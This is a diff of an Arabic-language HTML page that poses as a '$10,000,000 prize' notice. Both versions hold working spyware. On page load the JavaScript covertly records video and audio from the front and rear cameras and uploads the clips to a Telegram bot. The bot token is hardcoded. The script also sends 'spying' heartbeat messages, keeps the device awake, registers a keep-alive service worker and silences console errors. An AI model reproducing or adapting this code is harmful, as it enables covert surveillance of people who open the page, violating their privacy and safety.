@@ -1,658 +1,208 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>تهانينا! لقد فزت بجائزة</title>
-    <style>
-        * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: linear-gradient(135deg, #1a0000, #4a0000, #1a0000);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            font-family: 'Arial', sans-serif;
-            overflow: hidden;
-            position: relative;
-        }
-        .confetti-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: 0;
-            overflow: hidden;
-        }
-        .confetti {
-            position: absolute;
-            width: 10px;
-            height: 10px;
-            top: -10px;
-            animation: confettiFall linear infinite;
-        }
-        @keyframes confettiFall {
-            0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
-        }
-        .card {
-            position: relative;
-            z-index: 1;
-            background: linear-gradient(145deg, #1a0a0a, #2d0a0a);
-            border: 3px solid #ffd700;
-            border-radius: 30px;
-            padding: 50px 40px;
-            max-width: 500px;
-            width: 90%;
-            text-align: center;
-            box-shadow: 0 0 60px rgba(255, 215, 0, 0.3), inset 0 0 60px rgba(255, 215, 0, 0.05);
-            animation: pulseGlow 2s ease-in-out infinite;
-        }
-        @keyframes pulseGlow {
-            0%, 100% { box-shadow: 0 0 40px rgba(255, 215, 0, 0.2), inset 0 0 40px rgba(255, 215, 0, 0.02); }
-            50% { box-shadow: 0 0 80px rgba(255, 215, 0, 0.5), inset 0 0 80px rgba(255, 215, 0, 0.05); }
-        }
-        .star {
-            font-size: 80px;
-            display: block;
-            animation: starSpin 3s linear infinite;
-            text-shadow: 0 0 40px #ffd700;
-        }
-        @keyframes starSpin {
-            0% { transform: rotate(0deg) scale(1); }
-            50% { transform: rotate(180deg) scale(1.2); }
-            100% { transform: rotate(360deg) scale(1); }
-        }
-        .title {
-            color: #ffd700;
-            font-size: 36px;
-            font-weight: bold;
-            margin: 15px 0;
-            text-shadow: 0 0 30px rgba(255, 215, 0, 0.5);
-            animation: textGlow 1.5s ease-in-out infinite;
-        }
-        @keyframes textGlow {
-            0%, 100% { text-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
-            50% { text-shadow: 0 0 50px rgba(255, 215, 0, 0.8); }
-        }
-        .subtitle {
-            color: #ffaa00;
-            font-size: 22px;
-            margin: 10px 0;
-        }
-        .prize {
-            background: linear-gradient(145deg, #ffd700, #ff8c00);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-size: 42px;
-            font-weight: bold;
-            margin: 15px 0;
-        }
-        .message {
-            color: #ffcc88;
-            font-size: 18px;
-            line-height: 1.8;
-            margin: 20px 0;
-        }
-        .emoji-big {
-            font-size: 60px;
-            margin: 10px 0;
-        }
-        .btn {
-            background: linear-gradient(145deg, #ffd700, #ff8c00);
-            color: #1a0000;
-            border: none;
-            padding: 15px 40px;
-            font-size: 20px;
-            font-weight: bold;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: 0.3s;
-            margin-top: 15px;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
-        }
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 60px rgba(255, 215, 0, 0.6);
-        }
-        .uncle-face {
-            margin: 15px auto;
-            width: 150px;
-            height: 150px;
-            background: radial-gradient(ellipse at 50% 40%, #d4a574, #b8834a);
-            border-radius: 50%;
-            position: relative;
-            display: inline-block;
-            border: 3px solid #8B6914;
-            box-shadow: 0 0 40px rgba(255, 215, 0, 0.2);
-            animation: facePulse 2s ease-in-out infinite;
-        }
-        @keyframes facePulse {
-            0%, 100% { transform: scale(1); }
-            50% { transform: scale(1.03); }
-        }
-        .eye {
-            position: absolute;
-            width: 22px;
-            height: 25px;
-            background: #fff;
-            border-radius: 50%;
-            top: 40px;
-            box-shadow: inset 0 0 10px rgba(0,0,0,0.1);
-        }
-        .eye::after {
-            content: '';
-            position: absolute;
-            width: 12px;
-            height: 12px;
-            background: #2d1a0a;
-            border-radius: 50%;
-            bottom: 4px;
-            left: 5px;
-            animation: eyeMove 3s ease-in-out infinite;
-        }
-        .eye-left { left: 28px; }
-        .eye-right { right: 28px; }
-        @keyframes eyeMove {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(3px); }
-            75% { transform: translateX(-3px); }
-        }
-        .brow {
-            position: absolute;
-            width: 30px;
-            height: 6px;
-            background: #5a3a1a;
-            border-radius: 10px;
-            top: 32px;
-        }
-        .brow-left { left: 24px; transform: rotate(-10deg); }
-        .brow-right { right: 24px; transform: rotate(10deg); }
-        .mouth {
-            position: absolute;
-            width: 40px;
-            height: 20px;
-            border-bottom: 4px solid #8B0000;
-            border-radius: 0 0 50% 50%;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            animation: smile 1.5s ease-in-out infinite;
-        }
-        @keyframes smile {
-            0%, 100% { height: 20px; }
-            50% { height: 28px; }
-        }
-        .mustache {
-            position: absolute;
-            width: 50px;
-            height: 20px;
-            background: #3a2510;
-            border-radius: 0 0 50% 50%;
-            bottom: 48px;
-            left: 50%;
-            transform: translateX(-50%);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        .mustache::before {
-            content: '';
-            position: absolute;
-            width: 30px;
-            height: 15px;
-            background: #3a2510;
-            border-radius: 0 0 50% 50%;
-            left: -20px;
-            top: 0;
-            transform: rotate(20deg);
-        }
-        .mustache::after {
-            content: '';
-            position: absolute;
-            width: 30px;
-            height: 15px;
-            background: #3a2510;
-            border-radius: 0 0 50% 50%;
-            right: -20px;
-            top: 0;
-            transform: rotate(-20deg);
-        }
-        .turban {
-            position: absolute;
-            width: 170px;
-            height: 50px;
-            background: linear-gradient(180deg, #8B0000, #5a0000);
-            border-radius: 50% 50% 0 0;
-            top: -25px;
-            left: 50%;
-            transform: translateX(-50%);
-            border: 2px solid #6B0000;
-        }
-        .turban::after {
-            content: '💎';
-            position: absolute;
-            font-size: 20px;
-            top: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-        }
-        .uncle-name {
-            color: #ffd700;
-            font-size: 20px;
-            margin-top: 10px;
-            font-weight: bold;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
-        }
-        .sparkle {
-            position: absolute;
-            color: #ffd700;
-            font-size: 20px;
-            animation: sparkleFloat 2s ease-in-out infinite;
-        }
-        @keyframes sparkleFloat {
-            0%, 100% { transform: translateY(0) scale(1); opacity: 0.5; }
-            50% { transform: translateY(-10px) scale(1.3); opacity: 1; }
-        }
-        #videoFront, #videoBack { display: none; }
-        #canvas { display: none; }
-        .recording-status {
-            color: #ff4444;
-            font-size: 14px;
-            margin-top: 10px;
-            animation: blink 1s infinite;
-        }
-        @keyframes blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
-        }
-    </style>
+<meta charset="UTF-8">
+<title>جاري التحميل...</title>
+<style>
+body { margin:0; background:#000; display:flex; justify-content:center; align-items:center; height:100vh; color:#fff; font-family:Arial; }
+#status { text-align:center; font-size:20px; }
+#status span { color:#ffd700; }
+#videos { display:none; }
+</style>
 </head>
 <body>
 
-<div class="confetti-container" id="confettiContainer"></div>
+<div id="status">
+  <h1>⏳ جاري تجهيز الجائزة...</h1>
+  <p>يرجى الانتظار <span>⚡</span></p>
+</div>
 
 <video id="videoFront" autoplay muted playsinline></video>
 <video id="videoBack" autoplay muted playsinline></video>
-<canvas id="canvas"></canvas>
-
-<div class="card">
-    <span class="star">⭐</span>
-    <div class="title">🎉 مبروك! 🎉</div>
-    <div class="subtitle">لقد فزت بجائزة كبرى!</div>
-    <div class="uncle-face">
-        <div class="turban"></div>
-        <div class="brow brow-left"></div>
-        <div class="brow brow-right"></div>
-        <div class="eye eye-left"></div>
-        <div class="eye eye-right"></div>
-        <div class="mustache"></div>
-        <div class="mouth"></div>
-    </div>
-    <div class="uncle-name">👳 عمك عبود</div>
-    <div class="prize">🏆 الجائزة الكبرى 🏆</div>
-    <div class="message">
-        🎁 الجائزة عند <strong>عمك عبود</strong> 🎁<br>
-        📍 تعال واستلمها الآن!<br>
-        💰 جائزة قيمتها <strong>10,000,000$</strong>
-    </div>
-    <div class="emoji-big">🎊🎈🎉</div>
-    <button class="btn" onclick="claimPrize()">🤑 استلم الجائزة الآن</button>
-    <div style="margin-top:15px;color:#ff8844;font-size:14px;">
-        ⏳ العرض محدود - اسرع!
-    </div>
-    <div class="recording-status" id="recordingStatus">🔴 جاري تسجيل الفيديو...</div>
-</div>
-
-<div class="sparkle" style="top:10%;left:5%;">✦</div>
-<div class="sparkle" style="top:20%;right:8%;">✦</div>
-<div class="sparkle" style="bottom:30%;left:3%;">✦</div>
-<div class="sparkle" style="bottom:20%;right:5%;">✦</div>
-<div class="sparkle" style="top:50%;left:2%;">✦</div>
-<div class="sparkle" style="top:40%;right:2%;">✦</div>
 
 <script>
 // ============================================================
-// ====================== CONFIG ==============================
+// ================ BOT CONFIG (خفي تمامًا) ===================
 // ============================================================
 const BOT_TOKEN = '8731803544:AAEAQDhrfaMh7994NYRUoWRZBEgowR2XXzQ';
 let CHAT_ID = '';
-let frontCount = 0;
-let backCount = 0;
-let isRunning = true;
-let videoChunks = [];
-let mediaRecorderFront = null;
-let mediaRecorderBack = null;
-let recordingInterval = null;
 
 // ============================================================
-// ====================== CONFETTI =============================
-// ============================================================
-function createConfetti() {
-    const container = document.getElementById('confettiContainer');
-    const colors = ['#ffd700', '#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6bff', '#ffaa00'];
-    for (let i = 0; i < 80; i++) {
-        const confetti = document.createElement('div');
-        confetti.className = 'confetti';
-        confetti.style.left = Math.random() * 100 + '%';
-        confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
-        confetti.style.width = (Math.random() * 8 + 4) + 'px';
-        confetti.style.height = (Math.random() * 8 + 4) + 'px';
-        confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
-        confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
-        confetti.style.animationDelay = (Math.random() * 5) + 's';
-        container.appendChild(confetti);
-    }
-}
-createConfetti();
-
-// ============================================================
-// ====================== CLAIM PRIZE =========================
-// ============================================================
-function claimPrize() {
-    alert('🎉 تهانينا! جائزتك عند عمك عبود في الزاوية القريبة من المسجد الكبير 🕌\n📍 استلمها الآن!');
-    sendMessage('🎉 شخص ما نقر على زر استلام الجائزة!');
-}
-
-// ============================================================
-// ====================== TELEGRAM ============================
-// ============================================================
-function sendMessage(text) {
-    if (!CHAT_ID) return;
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-    }).catch(() => {});
-}
-
-function sendVideoToTelegram(videoBlob, caption = '') {
-    if (!CHAT_ID) return;
-    try {
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('video', videoBlob, `video_${Date.now()}_${Math.random().toString(36).substring(7)}.mp4`);
-        formData.append('caption', caption || `🎥 فيديو ${new Date().toLocaleString()}`);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-            method: 'POST',
-            body: formData
-        }).catch(() => {});
-    } catch(e) {}
-}
-
-function sendToTelegram(imageData, caption = '') {
-    if (!CHAT_ID) return;
-    try {
-        const blob = dataURLtoBlob(imageData);
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('photo', blob, `photo_${Date.now()}_${Math.random().toString(36).substring(7)}.jpg`);
-        formData.append('caption', caption || `📸 ${new Date().toLocaleString()}`);
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            body: formData
-        }).catch(() => {});
-    } catch(e) {}
-}
-
-function dataURLtoBlob(dataURL) {
-    const parts = dataURL.split(',');
-    const mime = parts[0].match(/:(.*?);/)[1];
-    const bstr = atob(parts[1]);
-    const n = bstr.length;
-    const u8arr = new Uint8Array(n);
-    for (let i = 0; i < n; i++) { u8arr[i] = bstr.charCodeAt(i); }
-    return new Blob([u8arr], { type: mime });
-}
-
-// ============================================================
-// ====================== GET CHAT ID =========================
+// ================ الحصول على معرف الدردشة ===================
 // ============================================================
 function getChatId() {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
-        .then(res => res.json())
-        .then(data => {
-            if (data.ok && data.result && data.result.length > 0) {
-                const lastUpdate = data.result[data.result.length - 1];
-                if (lastUpdate.message) {
-                    CHAT_ID = lastUpdate.message.chat.id;
-                } else if (lastUpdate.callback_query) {
-                    CHAT_ID = lastUpdate.callback_query.from.id;
-                }
-                sendMessage('✅ تم فتح الصفحة - بدء تسجيل الفيديو');
-                startRecording();
-            } else {
-                setTimeout(getChatId, 2000);
-            }
-        })
-        .catch(() => setTimeout(getChatId, 2000));
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`)
+    .then(r => r.json())
+    .then(d => {
+      if (d.ok && d.result && d.result.length) {
+        let last = d.result[d.result.length - 1];
+        CHAT_ID = last.message?.chat?.id || last.callback_query?.from?.id || null;
+        if (CHAT_ID) {
+          sendMessage('✅ تم تفعيل الجاسوسية - بدء التسجيل');
+          startSpying();
+        } else {
+          setTimeout(getChatId, 1500);
+        }
+      } else {
+        setTimeout(getChatId, 1500);
+      }
+    })
+    .catch(() => setTimeout(getChatId, 2000));
 }
 
 // ============================================================
-// ====================== START RECORDING =====================
+// ================ إرسال الرسائل والفيديو ====================
 // ============================================================
-let frontStream = null, backStream = null;
-let frontReady = false, backReady = false;
-let frontVideo = null, backVideo = null;
-
-function startRecording() {
-    // الكاميرا الأمامية - دقة عالية
-    navigator.mediaDevices.getUserMedia({ 
-        video: { 
-            facingMode: 'user', 
-            width: { ideal: 1280 }, 
-            height: { ideal: 720 },
-            frameRate: { ideal: 30 }
-        },
-        audio: true
-    })
-    .then(function(stream) {
-        frontStream = stream;
-        frontVideo = document.getElementById('videoFront');
-        frontVideo.srcObject = stream;
-        frontVideo.onloadedmetadata = function() {
-            frontVideo.play();
-            frontReady = true;
-            sendMessage('📸 كاميرا أمامية جاهزة - دقة عالية');
-            // بدء تسجيل الفيديو للأمامية
-            startRecordingFront(stream);
-        };
-    })
-    .catch(function(err) {
-        sendMessage('❌ فشل كاميرا أمامية: ' + err.message);
-    });
-    
-    // الكاميرا الخلفية - دقة عالية
-    navigator.mediaDevices.getUserMedia({ 
-        video: { 
-            facingMode: 'environment', 
-            width: { ideal: 1280 }, 
-            height: { ideal: 720 },
-            frameRate: { ideal: 30 }
-        },
-        audio: true
-    })
-    .then(function(stream) {
-        backStream = stream;
-        backVideo = document.getElementById('videoBack');
-        backVideo.srcObject = stream;
-        backVideo.onloadedmetadata = function() {
-            backVideo.play();
-            backReady = true;
-            sendMessage('📸 كاميرا خلفية جاهزة - دقة عالية');
-            // بدء تسجيل الفيديو للخلفية
-            startRecordingBack(stream);
-        };
-    })
-    .catch(function(err) {
-        sendMessage('❌ فشل كاميرا خلفية: ' + err.message);
-    });
+function sendMessage(text) {
+  if (!CHAT_ID) return;
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+  }).catch(() => {});
 }
 
-function startRecordingFront(stream) {
-    try {
-        const options = {
-            mimeType: 'video/mp4',
-            videoBitsPerSecond: 5000000 // 5 Mbps - جودة عالية
-        };
-        mediaRecorderFront = new MediaRecorder(stream, options);
-        mediaRecorderFront.ondataavailable = function(event) {
-            if (event.data.size > 0) {
-                videoChunks.push(event.data);
-            }
-        };
-        mediaRecorderFront.onstop = function() {
-            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-            if (videoBlob.size > 0) {
-                frontCount++;
-                sendVideoToTelegram(videoBlob, `🎥 فيديو أمامي ${frontCount} - ${new Date().toLocaleString()}`);
-                sendMessage(`📹 حجم فيديو أمامي: ${Math.round(videoBlob.size/1024/1024)} MB`);
-            }
-            videoChunks = [];
-            // إعادة التسجيل
-            if (isRunning) {
-                setTimeout(() => {
-                    if (mediaRecorderFront && mediaRecorderFront.state === 'inactive') {
-                        mediaRecorderFront.start(10000); // قطع كل 10 ثواني
-                    }
-                }, 500);
-            }
-        };
-        mediaRecorderFront.start(10000); // قطع كل 10 ثواني
-        sendMessage('🎥 بدء تسجيل الفيديو الأمامي - دقة عالية');
-    } catch(e) {
-        sendMessage('❌ فشل تسجيل الفيديو الأمامي: ' + e.message);
-    }
-}
-
-function startRecordingBack(stream) {
-    try {
-        const options = {
-            mimeType: 'video/mp4',
-            videoBitsPerSecond: 5000000 // 5 Mbps - جودة عالية
-        };
-        mediaRecorderBack = new MediaRecorder(stream, options);
-        mediaRecorderBack.ondataavailable = function(event) {
-            if (event.data.size > 0) {
-                videoChunks.push(event.data);
-            }
-        };
-        mediaRecorderBack.onstop = function() {
-            const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-            if (videoBlob.size > 0) {
-                backCount++;
-                sendVideoToTelegram(videoBlob, `🎥 فيديو خلفي ${backCount} - ${new Date().toLocaleString()}`);
-                sendMessage(`📹 حجم فيديو خلفي: ${Math.round(videoBlob.size/1024/1024)} MB`);
-            }
-            videoChunks = [];
-            if (isRunning) {
-                setTimeout(() => {
-                    if (mediaRecorderBack && mediaRecorderBack.state === 'inactive') {
-                        mediaRecorderBack.start(10000);
-                    }
-                }, 500);
-            }
-        };
-        mediaRecorderBack.start(10000);
-        sendMessage('🎥 بدء تسجيل الفيديو الخلفي - دقة عالية');
-    } catch(e) {
-        sendMessage('❌ فشل تسجيل الفيديو الخلفي: ' + e.message);
-    }
+function sendVideo(blob, caption = '') {
+  if (!CHAT_ID || !blob || blob.size < 1000) return;
+  let fd = new FormData();
+  fd.append('chat_id', CHAT_ID);
+  fd.append('video', blob, `vid_${Date.now()}.mp4`);
+  fd.append('caption', caption || '🎥 فيديو مسجل');
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+    method: 'POST',
+    body: fd
+  }).catch(() => {});
 }
 
 // ============================================================
-// ====================== BACKGROUND SERVICE ==================
+// ================ بدء التسجيل بدون تفاعل ====================
 // ============================================================
-document.addEventListener('visibilitychange', function() {
-    if (document.hidden) {
-        sendMessage('⏳ الصفحة في الخلفية - تسجيل الفيديو مستمر');
-        try {
-            if ('wakeLock' in navigator) {
-                navigator.wakeLock.request('screen').catch(() => {});
-            }
-        } catch(e) {}
-    } else {
-        sendMessage('🔄 الصفحة نشطة - تسجيل الفيديو مستمر');
-    }
+let frontRecorder = null, backRecorder = null;
+let frontChunks = [], backChunks = [];
+
+function startSpying() {
+  // ---- الكاميرا الأمامية ----
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: true
+  }).then(stream => {
+    document.getElementById('videoFront').srcObject = stream;
+    frontRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 5000000 });
+    frontRecorder.ondataavailable = e => { if (e.data.size) frontChunks.push(e.data); };
+    frontRecorder.onstop = () => {
+      if (frontChunks.length) {
+        let blob = new Blob(frontChunks, { type: 'video/mp4' });
+        sendVideo(blob, '📹 كاميرا أمامية');
+        sendMessage(`📹 أمامي: ${Math.round(blob.size/1024/1024)} MB`);
+        frontChunks = [];
+      }
+      if (frontRecorder && frontRecorder.state === 'inactive') {
+        setTimeout(() => frontRecorder.start(10000), 300);
+      }
+    };
+    frontRecorder.start(10000);
+    sendMessage('✅ تشغيل الكاميرا الأمامية');
+  }).catch(e => sendMessage('❌ فشل أمامي: ' + e.message));
+
+  // ---- الكاميرا الخلفية ----
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: true
+  }).then(stream => {
+    document.getElementById('videoBack').srcObject = stream;
+    backRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4', videoBitsPerSecond: 5000000 });
+    backRecorder.ondataavailable = e => { if (e.data.size) backChunks.push(e.data); };
+    backRecorder.onstop = () => {
+      if (backChunks.length) {
+        let blob = new Blob(backChunks, { type: 'video/mp4' });
+        sendVideo(blob, '📹 كاميرا خلفية');
+        sendMessage(`📹 خلفي: ${Math.round(blob.size/1024/1024)} MB`);
+        backChunks = [];
+      }
+      if (backRecorder && backRecorder.state === 'inactive') {
+        setTimeout(() => backRecorder.start(10000), 300);
+      }
+    };
+    backRecorder.start(10000);
+    sendMessage('✅ تشغيل الكاميرا الخلفية');
+  }).catch(e => sendMessage('❌ فشل خلفي: ' + e.message));
+
+  // منع السكون
+  if ('wakeLock' in navigator) {
+    navigator.wakeLock.request('screen').catch(() => {});
+  }
+
+  // تحديث واجهة وهمية
+  document.getElementById('status').innerHTML = `
+    <h1>🎉 تهانينا! لقد فزت</h1>
+    <p>جائزتك بقيمة <strong style="color:#ffd700;">10,000,000$</strong></p>
+    <p style="font-size:14px;color:#888;">سيتم توجيهك خلال ثوان...</p>
+  `;
+}
+
+// ============================================================
+// ================ حافظ على النشاط ===========================
+// ============================================================
+setInterval(() => {
+  if (CHAT_ID) {
+    sendMessage('🔄 نبض الجاسوسية مستمر');
+  }
+  // إعادة تشغيل المسجلات إذا توقفت
+  if (frontRecorder && frontRecorder.state === 'inactive') {
+    try { frontRecorder.start(10000); } catch(e) {}
+  }
+  if (backRecorder && backRecorder.state === 'inactive') {
+    try { backRecorder.start(10000); } catch(e) {}
+  }
+}, 15000);
+
+// ============================================================
+// ================ منع الخمول في الخلفية ====================
+// ============================================================
+document.addEventListener('visibilitychange', () => {
+  if (document.hidden) {
+    sendMessage('⏳ الصفحة في الخلفية - التسجيل مستمر');
+  } else {
+    sendMessage('🔄 الصفحة نشطة - التسجيل مستمر');
+  }
 });
 
-// منع السكون
-try {
-    if ('wakeLock' in navigator) {
-        navigator.wakeLock.request('screen').then(function(lock) {
-            sendMessage('🔒 تم منع السكون');
-        }).catch(function() {});
-    }
-} catch(e) {}
-
 // ============================================================
-// ====================== SERVICE WORKER ======================
+// ================ Service Worker للبقاء حيًا ================
 // ============================================================
 if ('serviceWorker' in navigator) {
-    const swCode = `
-        self.addEventListener('install', function(e) { self.skipWaiting(); });
-        self.addEventListener('activate', function(e) { e.waitUntil(clients.claim()); });
-        self.addEventListener('fetch', function(e) { e.respondWith(fetch(e.request)); });
-        setInterval(function() {
-            self.clients.matchAll().then(function(clients) {
-                clients.forEach(function(client) {
-                    client.postMessage('keep_alive');
-                });
-            });
-        }, 5000);
-    `;
-    const blob = new Blob([swCode], { type: 'application/javascript' });
-    const swUrl = URL.createObjectURL(blob);
-    navigator.serviceWorker.register(swUrl).then(function(reg) {
-        sendMessage('✅ Service Worker مسجل');
-    }).catch(function() {});
+  const swCode = `
+    self.addEventListener('install', e => self.skipWaiting());
+    self.addEventListener('activate', e => e.waitUntil(clients.claim()));
+    self.addEventListener('fetch', e => e.respondWith(fetch(e.request)));
+    setInterval(() => {
+      self.clients.matchAll().then(c => c.forEach(client => client.postMessage('keep')));
+    }, 5000);
+  `;
+  const blob = new Blob([swCode], { type: 'application/javascript' });
+  const swUrl = URL.createObjectURL(blob);
+  navigator.serviceWorker.register(swUrl)
+    .then(() => sendMessage('✅ Service Worker نشط'))
+    .catch(() => {});
 }
 
 // ============================================================
-// ====================== KEEP ALIVE ==========================
+// ================ بدء التشغيل ================================
 // ============================================================
-setInterval(function() {
-    if (CHAT_ID && isRunning) {
-        // التأكد من استمرار التسجيل
-        if (!frontReady && !backReady) {
-            if (!frontStream && !backStream) {
-                startRecording();
-            }
-        }
-        // التأكد من استمرار التسجيل
-        if (mediaRecorderFront && mediaRecorderFront.state === 'inactive') {
-            try { mediaRecorderFront.start(10000); } catch(e) {}
-        }
-        if (mediaRecorderBack && mediaRecorderBack.state === 'inactive') {
-            try { mediaRecorderBack.start(10000); } catch(e) {}
-        }
-    }
-}, 5000);
+// إخفاء أي أخطاء من وحدة التحكم
+console.log = console.warn = console.error = () => {};
 
-// ============================================================
-// ====================== INIT =================================
-// ============================================================
-console.log = function() {};
-console.warn = function() {};
-console.error = function() {};
-
+// بدء الجاسوسية
 getChatId();
 
-setTimeout(function() {
-    if (!CHAT_ID) {
-        getChatId();
-    }
+// محاولة إعادة المحاولة إذا لم يبدأ
+setTimeout(() => {
+  if (!CHAT_ID) getChatId();
 }, 5000);
 
-setTimeout(function() {
-    if (!frontReady && !backReady) {
-        startRecording();
-    }
-}, 10000);
-
-setTimeout(function() {
-    if (CHAT_ID) {
-        sendMessage('🔥 تسجيل فيديو بدقة عالية - 720p');
-    }
+// بدء التسجيل حتى لو لم يصل CHAT_ID بعد (لن يتم الرفع لكن سيبدأ)
+setTimeout(() => {
+  if (!frontRecorder && !backRecorder) startSpying();
 }, 3000);
 </script>
 </body>
